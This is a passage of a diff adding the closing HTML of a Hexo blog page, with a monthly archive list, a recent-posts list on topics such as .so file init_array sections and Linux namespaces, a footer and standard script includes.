class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/07/29/so%E6%96%87%E4%BB%B6%E7%9A%84-init-array%E6%AE%B5%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/">so文件的.init_array段中添加代码</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/09/PID-namespace/">PID namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/08/Mount-namespace/">Mount namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/06/User-namespace/">User namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/01/UnionFS%E6%8A%80%E6%9C%AF/">UnionFS技术</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
